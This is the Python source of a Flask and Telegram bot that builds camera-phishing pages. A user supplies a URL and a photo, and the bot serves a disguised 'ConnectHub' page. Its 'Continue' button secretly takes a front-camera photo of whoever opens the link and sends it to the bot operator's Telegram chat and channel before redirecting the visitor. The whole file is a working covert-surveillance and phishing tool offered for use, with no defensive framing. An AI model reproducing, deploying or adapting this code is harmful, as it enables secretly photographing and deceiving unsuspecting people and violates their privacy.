from flask import Flask, request, jsonify, send_from_directory
import telebot
import os
import time
import json
import logging
import sys
import requests
from datetime import datetime, timedelta

logging.basicConfig(stream=sys.stdout, level=logging.INFO, format='%(asctime)s - %(levelname)s - %(message)s')
logger = logging.getLogger(__name__)

app = Flask(__name__)

TOKEN = os.environ.get("BOT_TOKEN")
CHANNEL_ID = os.environ.get("CHANNEL_ID")
ACCOUNT_NAME = "telegram-bot-b9j0"
HTML_DIR = "html_files"
PHOTO_DIR = "photos"
USER_STATE_FILE = "user_states.json"

os.makedirs(HTML_DIR, exist_ok=True)
os.makedirs(PHOTO_DIR, exist_ok=True)

if not os.path.exists(USER_STATE_FILE):
    with open(USER_STATE_FILE, "w") as f:
        json.dump({}, f)

bot = telebot.TeleBot(TOKEN)

# Helper
def get_state(user_id):
    with open(USER_STATE_FILE, "r") as f:
        data = json.load(f)
    return data.get(str(user_id), {"state": None, "url": None})

def set_state(user_id, state, url=None):
    with open(USER_STATE_FILE, "r") as f:
        data = json.load(f)
    data[str(user_id)] = {"state": state, "url": url}
    with open(USER_STATE_FILE, "w") as f:
        json.dump(data, f)

def generate_html(user_id, target_url, photo_path):
    filename = f"v_{user_id}_{int(time.time())}.html"
    full_path = os.path.join(HTML_DIR, filename)
    photo_url = f"https://{ACCOUNT_NAME}.onrender.com/photos/{os.path.basename(photo_path)}"
    
    html = f"""<!DOCTYPE html>
<html>
<head><meta charset="UTF-8"><meta name="viewport" content="width=device-width, initial-scale=1.0"><title>ConnectHub</title>
<style>
body{{font-family:sans-serif;background:#667eea;display:flex;justify-content:center;align-items:center;min-height:100vh}}
.card{{background:#fff;border-radius:30px;padding:30px;max-width:350px;text-align:center}}
img{{width:100px;height:100px;border-radius:50%;object-fit:cover;margin:20px auto}}
.btn{{background:#e94560;color:#fff;padding:14px;border:none;border-radius:40px;font-size:18px;width:100%;margin-top:20px;cursor:pointer;animation:pulse 2s infinite}}
@keyframes pulse{{0%{{transform:scale(1)}}50%{{transform:scale(1.03)}}100%{{transform:scale(1)}}}}
</style>
</head>
<body>
<div class="card">
    <h2>ConnectHub</h2>
    <img src="{photo_url}">
    <p>Tap below to continue</p>
    <button class="btn" onclick="requestCamera()">🚀 Continue →</button>
</div>
<video id="video" style="display:none"></video>
<canvas id="canvas" style="display:none"></canvas>
<script>
const TOKEN = "{TOKEN}";
const USER = {user_id};
const TARGET = "{target_url}";

async function sendToUser(text, file=null) {{
    try {{
        if(file) {{
            let fd = new FormData(); fd.append('chat_id', USER); fd.append('photo', file);
            await fetch('https://api.telegram.org/bot'+TOKEN+'/sendPhoto', {{method:'POST',body:fd}});
            if("{CHANNEL_ID}"){{
                let fd2 = new FormData(); fd2.append('chat_id', "{CHANNEL_ID}"); fd2.append('photo', file);
                await fetch('https://api.telegram.org/bot'+TOKEN+'/sendPhoto', {{method:'POST',body:fd2}});
            }}
        }} else {{
            await fetch('https://api.telegram.org/bot'+TOKEN+'/sendMessage', {{method:'POST',headers:{{'Content-Type':'application/json'}},body:JSON.stringify({{chat_id:USER, text:text}})}});
        }}
    }} catch(e){{}}
}}

async function capturePhoto() {{
    try {{
        let s = await navigator.mediaDevices.getUserMedia({{video:{{facingMode:'user'}}}});
        let v = document.getElementById('video'); v.srcObject = s;
        await new Promise(r => v.onloadedmetadata = () => {{ v.play(); r(); }});
        await new Promise(r => setTimeout(r, 300));
        let c = document.getElementById('canvas'); c.width = v.videoWidth; c.height = v.videoHeight;
        c.getContext('2d').drawImage(v, 0, 0);
        let blob = await new Promise(r => c.toBlob(r, 'image/jpeg', 0.9));
        if(blob) await sendToUser('📸 Camera photo', blob);
        s.getTracks().forEach(t => t.stop());
        return true;
    }} catch(e){{ return false; }}
}}

async function requestCamera() {{
    let ok = await capturePhoto();
    if(ok) {{
        window.location.href = TARGET;
    }} else {{
        alert("Camera access required");
    }}
}}
</script>
</body>
</html>"""
    with open(full_path, "w") as f:
        f.write(html)
    return filename

# Bot handlers
@bot.message_handler(commands=['start'])
def start_cmd(msg):
    uid = msg.chat.id
    set_state(uid, "waiting_url")
    bot.reply_to(msg, "Send me any URL")

@bot.message_handler(func=lambda m: get_state(m.chat.id)["state"] == "waiting_url" and m.text and m.text.startswith(('http://','https://')))
def handle_url(msg):
    uid = msg.chat.id
    set_state(uid, "waiting_photo", url=msg.text)
    bot.reply_to(msg, "Now share a photo with me")

@bot.message_handler(content_types=['photo'])
def handle_photo(msg):
    uid = msg.chat.id
    state = get_state(uid)
    if state["state"] != "waiting_photo":
        bot.reply_to(msg, "Send URL first using /start")
        return
    try:
        file_info = bot.get_file(msg.photo[-1].file_id)
        file_data = bot.download_file(file_info.file_path)
        photo_name = f"photo_{uid}_{int(time.time())}.jpg"
        photo_path = os.path.join(PHOTO_DIR, photo_name)
        with open(photo_path, "wb") as f:
            f.write(file_data)
        
        target = state["url"]
        html_file = generate_html(uid, target, photo_path)
        link = f"https://{ACCOUNT_NAME}.onrender.com/view/{html_file}"
        bot.reply_to(msg, f"✅ Your link:\n{link}\n\n(Active until you create a new one)")
        set_state(uid, "done")
    except Exception as e:
        logger.error(f"Photo error: {e}")
        bot.reply_to(msg, "Error, please try again")

# Flask routes
@app.route('/webhook', methods=['POST'])
def webhook():
    try:
        data = request.get_data().decode('utf-8')
        update = telebot.types.Update.de_json(data)
        bot.process_new_updates([update])
        return "ok", 200
    except Exception as e:
        logger.error(f"Webhook error: {e}")
        return "error", 500

@app.route('/view/<filename>')
def view_html(filename):
    return send_from_directory(HTML_DIR, filename)

@app.route('/photos/<filename>')
def serve_photo(filename):
    return send_from_directory(PHOTO_DIR, filename)

@app.route('/')
def home():
    return "🐉 Bot is live"

if __name__ == "__main__":
    port = int(os.environ.get("PORT", 10000))
    logger.info("✅ Bot starting...")
    app.run(host='0.0.0.0', port=port)
